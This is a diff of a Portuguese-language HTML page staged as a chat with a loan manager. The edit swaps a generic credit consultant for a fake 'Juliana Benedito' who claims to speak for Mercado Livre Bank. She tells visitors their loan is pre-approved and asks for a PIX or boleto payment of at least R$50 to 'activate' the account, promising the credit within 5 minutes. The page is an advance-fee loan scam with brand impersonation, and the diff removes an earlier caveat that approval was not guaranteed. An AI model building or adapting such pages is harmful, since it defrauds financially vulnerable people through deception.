@@ -81,64 +81,104 @@
   </div>
 
   <div class="chat-container">
-    <div class="notice">
-      <strong>Última etapa:</strong> finalize a ativação para liberar a análise do seu empréstimo.
-    </div>
 
-    <!-- M1 -->
-    <div class="message" id="m1">
-      <div class="message-header">
-        <div class="avatar">WF</div>
-        <strong>Ana — Consultora de Crédito</strong>
+  <!-- Banner de aviso -->
+  <div style="background-color: #fff8e1; border-left: 4px solid #FFE600; padding: 15px; margin-bottom: 30px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+    <div style="display: flex; align-items: center;">
+      <i class="fas fa-info-circle" style="color: #FFE600; margin-right: 12px; font-size: 20px;"></i>
+      <span style="color: #313131; font-size: 14px;">
+        Fique na página! Essa é a última etapa para confirmar a liberação do seu empréstimo!
+      </span>
+    </div>
+  </div>
+
+  <!-- Mensagem 1 -->
+  <div class="message" id="message1">
+    <div class="message-header">
+      <div class="avatar">
+        <img src="gerente.png" alt="Juliana Benedito">
       </div>
-      <div class="typing"><span></span><span></span><span></span></div>
-      <div class="message-content">
-        <div class="message-text" id="m1txt">
-          Olá! Parabéns pela sua <strong>pré-qualificação</strong> para empréstimo pessoal de até <strong>R$ 15.000</strong> 🎉<br><br>
-          Para liberar a análise final e emissão do contrato, precisamos confirmar sua conta e vincular seus dados.
+      <strong>Juliana Benedito - Gerente de Contas</strong>
+    </div>
+    <div class="typing"><span></span><span></span><span></span></div>
+    <div class="message-content">
+      <div class="message-text">
+        Olá 😊! Sou a Juliana, sua gerente de conta.  
+        Parabéns pela aprovação! 🎉  
+        Seu <strong>empréstimo Mercado Livre</strong> está pré-aprovado e pronto para liberação.  
+        Mas antes, precisamos confirmar a <strong>ativação da sua conta Mercado Livre Bank</strong>.
+      </div>
+      <div class="message-time"></div>
+    </div>
+  </div>
+
+  <!-- Mensagem 2 -->
+  <div class="message" id="message2">
+    <div class="message-header">
+      <div class="avatar">
+        <img src="gerente.png" alt="Juliana Benedito">
+      </div>
+      <strong>Juliana Benedito - Gerente de Contas</strong>
+    </div>
+    <div class="typing"><span></span><span></span><span></span></div>
+    <div class="message-content">
+      <div class="message-text">
+        A ativação é rápida e garante segurança no contrato de crédito.  
+        Com a conta ativa, você poderá:
+        <div class="benefits-list">
+          ✅ Receber o valor do empréstimo direto na conta<br>
+          ✅ Realizar PIX e pagamentos<br>
+          ✅ Consultar parcelas e extratos<br>
+          ✅ Suporte humano 24h
         </div>
-        <div class="message-time"></div>
       </div>
+      <div class="message-time"></div>
     </div>
+  </div>
 
-    <!-- M2 -->
-    <div class="message" id="m2">
-      <div class="message-header">
-        <div class="avatar">WF</div>
-        <strong>Ana — Consultora de Crédito</strong>
+  <!-- Mensagem 3 -->
+  <div class="message" id="message3">
+    <div class="message-header">
+      <div class="avatar">
+        <img src="gerente.png" alt="Juliana Benedito">
       </div>
-      <div class="typing"><span></span><span></span><span></span></div>
-      <div class="message-content">
-        <div class="message-text">
-          É rápido: a ativação custa <strong>R$ 50,00</strong> (taxa operacional de validação).<br>
-          <div class="benefits">
-            ✅ Prioriza sua análise e assinatura digital<br>
-            ✅ Habilita PIX e contrato em até 24h úteis após conferência<br>
-            ✅ Comprovante fiscal enviado no e-mail cadastrado
-          </div>
-          <small style="color:#6b6b6b">Obs.: a pré-qualificação não garante aprovação final. Sujeito à análise de crédito e documentação.</small>
-        </div>
-        <div class="message-time"></div>
-      </div>
+      <strong>Juliana Benedito - Gerente de Contas</strong>
     </div>
-
-    <!-- M3 -->
-    <div class="message" id="m3">
-      <div class="message-header">
-        <div class="avatar">WF</div>
-        <strong>Ana — Consultora de Crédito</strong>
+    <div class="typing"><span></span><span></span><span></span></div>
+    <div class="message-content">
+      <div class="message-text">
+        A ativação é feita através do primeiro uso da conta.  
+        Você pode realizar um PIX ou pagamento de boleto no valor mínimo de <strong>R$50,00</strong>.  
+        Esse valor continua disponível pra você usar normalmente.  
+        Após a confirmação, o crédito é liberado automaticamente 💰
       </div>
-      <div class="typing"><span></span><span></span><span></span></div>
-      <div class="message-content">
-        <div class="message-text" id="m3txt">
-          Para ativar agora, clique no botão abaixo. Usaremos seus dados salvos (nome, CPF, e-mail e telefone) — você pode revisar na próxima tela antes de pagar.
-        </div>
-        <div class="message-time"></div>
-      </div>
+      <div class="message-time"></div>
     </div>
+  </div>
 
-    <!-- CTA -->
-    <button id="btnAtivar" class="button pulse2">Ativar análise por R$ 50</button>
+  <!-- Mensagem 4 -->
+  <div class="message" id="message4">
+    <div class="message-header">
+      <div class="avatar">
+        <img src="gerente.png" alt="Juliana Benedito">
+      </div>
+      <strong>Juliana Benedito - Gerente de Contas</strong>
+    </div>
+    <div class="typing"><span></span><span></span><span></span></div>
+    <div class="message-content">
+      <div class="message-text">
+        Para liberar seu empréstimo, clique abaixo e faça a ativação agora mesmo.  
+        <br><br>
+        <strong>Assim que finalizado, o valor será creditado em até 5 minutos.</strong>
+      </div>
+      <div class="message-time"></div>
+    </div>
+  </div>
+
+  <!-- Botão -->
+  <button id="btnAtivar" class="button pulse2">Ativar conta e liberar empréstimo</button>
+
+</div>
 
     <div class="disclaimer">
       Esta é uma interface <strong>white-label</strong> operada pela <em>SuaMarca</em>. Não é site oficial de bancos de terceiros. 
